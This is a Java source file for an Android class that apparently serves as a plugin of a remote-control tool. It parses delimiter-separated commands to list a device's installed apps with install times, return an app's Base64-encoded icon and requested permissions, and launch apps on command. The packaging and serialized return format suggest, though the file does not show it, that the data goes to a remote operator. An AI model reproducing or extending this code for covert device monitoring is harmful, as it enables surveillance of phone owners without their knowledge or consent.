package plugens.angel.plugens;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.Canvas;
import android.graphics.drawable.BitmapDrawable;
import android.graphics.drawable.Drawable;
import android.util.Base64;
import java.io.ByteArrayOutputStream;
import java.io.UnsupportedEncodingException;
import java.util.Date;
import java.util.List;
public class apps {
    private static String SPL_DATA = "x0D0x";
    private static String SPL_ARRAY = "x0A0x";
    private static String SPL_LINE = "x0L0x";
    private static String OBJ = "<Object>";
    private static StringBuffer LoadApps = new StringBuffer();
    public Object method(Context c, String s, byte[] b) throws UnsupportedEncodingException {
        byte[] f = "null".getBytes();
        String[] d = s.split(SPL_DATA);
        switch(d[0]){
            case "apps":
                try {
                    if (LoadApps.toString().length() != 0){
                        String s0 = OBJ + SPL_DATA + LoadApps.toString() + SPL_DATA + c.getPackageName() ;
                        f =  s0.getBytes();
                        return f;
                    }
                } catch (Exception e) {}
                break;
            case "load":
                try {

                    if (LoadApps.toString().length() != 0){
                        LoadApps = new StringBuffer();
                    }

                        final PackageManager pm = c.getPackageManager();
                        List<ApplicationInfo> pk = pm.getInstalledApplications(PackageManager.GET_META_DATA);
                        for (ApplicationInfo p : pk) {
                            if (pm.getLaunchIntentForPackage(p.packageName) != null && !pm.getLaunchIntentForPackage(p.packageName).equals(""))
                            {
                                PackageInfo pInf = pm.getPackageInfo(p.packageName, PackageManager.GET_PERMISSIONS);
                                Date installTime = new Date(pInf.firstInstallTime);
                                String flag = "null";
                                if (pm.getLaunchIntentForPackage(p.packageName) != null) {
                                    if ((p.flags & ApplicationInfo.FLAG_SYSTEM) == 1) {
                                        flag = "System";
                                    } else {
                                        flag = "User";
                                    }
                                }
                                LoadApps.append(pm.getApplicationLabel(p) + SPL_ARRAY + flag + SPL_ARRAY + p.packageName + SPL_ARRAY + installTime + SPL_LINE);
                             }
                        }
                    if(d[1].equals("y")){
                        try {
                            if (LoadApps.toString().length()!=0){
                                String s0 = OBJ + SPL_DATA + LoadApps.toString() + SPL_DATA + c.getPackageName() ;
                                f =  s0.getBytes();
                                return f;
                            }
                        } catch (Exception e) {}
                    }
                } catch (Exception e) {}
                break;
            case "open":
                try{
                    open(d[1],c);
                } catch (Exception e) {}
                break;
            case "properties":

                    try {
                        StringBuffer sb = new StringBuffer();
                        String packages = d[1];
                        Drawable icon;
                        final PackageManager pm = c.getPackageManager();
                        ApplicationInfo packageInfo;
                        try {
                            packageInfo = pm.getApplicationInfo(packages, 0);
                        } catch (final PackageManager.NameNotFoundException e) {
                            packageInfo = null;
                        }
                        if (pm.getLaunchIntentForPackage(packageInfo.packageName) != null && !pm.getLaunchIntentForPackage(packageInfo.packageName).equals(""))
                        {
                            try {

                                PackageInfo pInf = pm.getPackageInfo(packageInfo.packageName, PackageManager.GET_PERMISSIONS);
                                Date installTime = new Date(pInf.firstInstallTime);
                                String flag = "";
                                if (pm.getLaunchIntentForPackage(packageInfo.packageName) != null) {
                                    if ((packageInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 1) {
                                        flag = "system";
                                    } else {
                                        flag = "user";
                                    }
                                }

                                icon = pm.getApplicationIcon(packageInfo.packageName);
                                String appIcon64 = new String();
                                if (icon instanceof BitmapDrawable) {
                                    Drawable icn = icon;
                                    if (icn != null) {
                                        BitmapDrawable bit = ((BitmapDrawable) icn);
                                        Bitmap bitmap = Bitmap.createScaledBitmap(bit.getBitmap(), 144, 144, true);
                                        ByteArrayOutputStream BOS = new ByteArrayOutputStream();
                                        bitmap.compress(Bitmap.CompressFormat.PNG, 75, BOS);
                                        byte[] bitmapByte = BOS.toByteArray();
                                        appIcon64 = Base64.encodeToString(bitmapByte, Base64.NO_WRAP);
                                    }
                                }else{
                                    Bitmap tempBitmap = Bitmap.createBitmap(icon.getIntrinsicWidth(), icon.getIntrinsicHeight(), Bitmap.Config
                                            .ARGB_8888);
                                    Canvas canvas = new Canvas(tempBitmap);
                                    icon.setBounds(0, 0, canvas.getWidth(), canvas.getHeight());
                                    icon.draw(canvas);
                                    Bitmap bitmap = Bitmap.createScaledBitmap(tempBitmap, 144, 144, true);
                                    if (tempBitmap != bitmap){
                                        tempBitmap.recycle();
                                    }
                                    ByteArrayOutputStream BOS = new ByteArrayOutputStream();
                                    bitmap.compress(Bitmap.CompressFormat.PNG, 75, BOS);
                                    byte[] bitmapByte = BOS.toByteArray();
                                    appIcon64 = Base64.encodeToString(bitmapByte, Base64.NO_WRAP);
                                }

                                sb.append(pm.getApplicationLabel(packageInfo) +
                                        SPL_ARRAY + packageInfo.packageName + SPL_ARRAY +
                                        appIcon64 + SPL_ARRAY + flag + SPL_ARRAY +
                                        installTime.toString());
                                sb.append(SPL_LINE);
                                try{
                                    PackageInfo paInfo = c.getPackageManager().getPackageInfo(packageInfo.packageName, PackageManager.GET_PERMISSIONS);
                                    String[] requestedPermissions = paInfo.requestedPermissions;
                                    if(requestedPermissions != null)
                                    {
                                        for (int j = 0; j < requestedPermissions.length; j++)
                                        {
                                            sb.append(requestedPermissions[j] + SPL_ARRAY);
                                        }
                                    }else{
                                        sb.append("null" + SPL_ARRAY);
                                    }
                                } catch(PackageManager.NameNotFoundException e){
                                    sb.append("null" + SPL_ARRAY);
                                }catch(OutOfMemoryError e){
                                    sb.append("null" + SPL_ARRAY);
                                }

                            } catch(PackageManager.NameNotFoundException e){
                            }catch(OutOfMemoryError e){}
                        }

                        String s0 = OBJ + SPL_DATA + sb.toString() ;
                        f =  s0.getBytes();
                        return f;
                    } catch (Exception e) {}

                break;

        }
        return f;
    }
    private void open(String p,Context c)
    {
        Intent i = c.getPackageManager().getLaunchIntentForPackage(p);
        if (i != null) {
            c.startActivity(i);
        }
    }
}
